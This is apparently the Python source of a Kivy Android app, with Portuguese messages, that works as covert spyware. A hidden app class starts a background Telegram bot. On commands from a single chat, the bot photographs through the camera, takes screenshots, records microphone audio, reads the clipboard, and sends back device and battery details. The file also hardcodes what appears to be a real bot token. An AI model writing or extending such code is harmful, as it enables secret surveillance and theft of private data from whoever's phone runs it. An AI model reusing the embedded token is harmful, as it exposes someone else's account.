from kivy.app import App
from kivy.clock import Clock
from plyer import vibrator, notification, camera, gps, battery
from plyer import uniqueid
from kivy.core.clipboard import Clipboard
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import os
import threading
import asyncio
import time
import platform
import sounddevice as sd
import soundfile as sf

BOT_TOKEN = '7943047881:AAGVNCBcmX__DMDJXsLKDGY0TV11nDRSwbk'
AUTHORIZED_CHAT_ID = -1002592732102  # Substitua pelo seu chat_id

class TelegramBot:
    def __init__(self):
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        self.application = ApplicationBuilder().token(BOT_TOKEN).build()

        self.application.add_handler(CommandHandler('vibrar', self.vibrar))
        self.application.add_handler(CommandHandler('notificar', self.notificar))
        self.application.add_handler(CommandHandler('tirarfoto', self.tirarfoto))
        self.application.add_handler(CommandHandler('tirarprint', self.tirarprint))
        self.application.add_handler(CommandHandler('localizacao', self.localizacao))
        self.application.add_handler(CommandHandler('bateria', self.bateria))
        self.application.add_handler(CommandHandler('info', self.info))
        self.application.add_handler(CommandHandler('clipboard', self.clipboard))
        self.application.add_handler(CommandHandler('gravar_audio', self.gravar_audio))

    def autorizado(self, update):
        return update.effective_chat.id == AUTHORIZED_CHAT_ID

    async def vibrar(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.autorizado(update): return
        vibrator.vibrate(1)
        await update.message.reply_text("✅ Vibrando por 1 segundo.")

    async def notificar(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.autorizado(update): return
        notification.notify(title="⚠️ Alerta", message="Notificação enviada via bot.")
        await update.message.reply_text("✅ Notificação enviada.")

    async def tirarfoto(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.autorizado(update): return
        filename = '/sdcard/foto.jpg'
        try:
            camera.take_picture(filename=filename, on_complete=lambda x: None)
            await asyncio.sleep(3)
            with open(filename, 'rb') as f:
                await update.message.reply_photo(photo=f)
            os.remove(filename)
        except Exception as e:
            await update.message.reply_text(f"❌ Erro ao tirar foto: {e}")

    async def tirarprint(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.autorizado(update): return
        try:
            from kivy.core.window import Window
            screenshot_path = '/sdcard/screenshot.png'
            Window.screenshot(name=screenshot_path)
            await asyncio.sleep(1)
            with open(screenshot_path, 'rb') as f:
                await update.message.reply_photo(photo=f)
            os.remove(screenshot_path)
        except Exception as e:
            await update.message.reply_text(f"❌ Erro ao tirar print: {e}")

    async def localizacao(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.autorizado(update): return
        try:
            gps.configure(on_location=lambda **kwargs: None)
            gps.start()
            await asyncio.sleep(5)
            gps.stop()
            await update.message.reply_text("📍 Localização capturada (simulada).")
        except Exception as e:
            await update.message.reply_text(f"❌ Localização não disponível: {e}")

    async def bateria(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.autorizado(update): return
        level = battery.status.get("percentage", "Desconhecido")
        await update.message.reply_text(f"🔋 Bateria: {level}%")

    async def info(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.autorizado(update): return
        info = (
            f"📱 Plataforma: {platform.system()} {platform.release()}\n"
            f"🆔 ID único: {uniqueid.id}"
        )
        await update.message.reply_text(info)

    async def clipboard(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.autorizado(update): return
        text = Clipboard.paste()
        await update.message.reply_text(f"📋 Copiado: {text}")

    async def gravar_audio(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.autorizado(update): return
        try:
            await update.message.reply_text("🎙️ Gravando áudio por 5 segundos...")
            fs = 44100
            duration = 5
            audio = sd.rec(int(duration * fs), samplerate=fs, channels=2)
            sd.wait()
            audio_path = '/sdcard/audio.wav'
            sf.write(audio_path, audio, fs)
            with open(audio_path, 'rb') as f:
                await update.message.reply_audio(f)
            os.remove(audio_path)
        except Exception as e:
            await update.message.reply_text(f"❌ Erro ao gravar áudio: {e}")

    def run(self):
        self.loop.run_until_complete(self.application.initialize())
        self.loop.create_task(self.application.start())
        self.loop.run_forever()

class HiddenApp(App):
    def build(self):
        threading.Thread(target=self.start_bot, daemon=True).start()

    def start_bot(self):
        bot = TelegramBot()
        bot.run()

if __name__ == '__main__':
    HiddenApp().run()
